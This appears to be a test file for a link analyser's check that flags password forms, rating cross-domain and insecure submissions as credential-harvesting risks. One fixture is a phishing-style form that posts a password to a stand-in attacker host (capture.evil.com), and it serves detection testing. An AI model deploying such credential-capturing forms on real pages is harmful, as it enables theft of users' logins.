import asyncio
from links.services.analyser import check_password
from links.services.checks.normalise import normalize
from links.services.registry import Context, CheckUnavailable


def run(html,url="https://example.com/login"):
    ctx=Context(url,nurl=normalize(url),fetch_result={"html_by_hop":[{"url":url,"html":html}]})
    return asyncio.run(check_password(ctx))

def test_password_form_cross_domain_action_on_intermediate_page_is_strong():
    findings=run('<form action="https://capture.evil.com/post"><input type="password"></form>')
    assert len(findings)==1 and findings[0].id.endswith(".cross_domain")
    assert findings[0].severity=="strong" and findings[0].evidence_group=="credential_harvesting"

def test_password_form_insecure_same_domain_action_is_moderate():
    findings=run('<form action="http://example.com/submit"><input type="password"></form>')
    assert len(findings)==1 and findings[0].id.endswith(".insecure_submission") and findings[0].severity=="moderate"

def test_non_password_forms_do_not_trigger():
    assert run('<form action="https://evil.com"><input type="email"></form>')==[]

def test_missing_fetcher_html_is_unavailable():
    ctx=Context("https://example.com",nurl=normalize("https://example.com"),fetch_result={})
    try: asyncio.run(check_password(ctx))
    except CheckUnavailable as exc: assert "no HTML" in str(exc)
    else: raise AssertionError("password check should be unavailable without HTML")
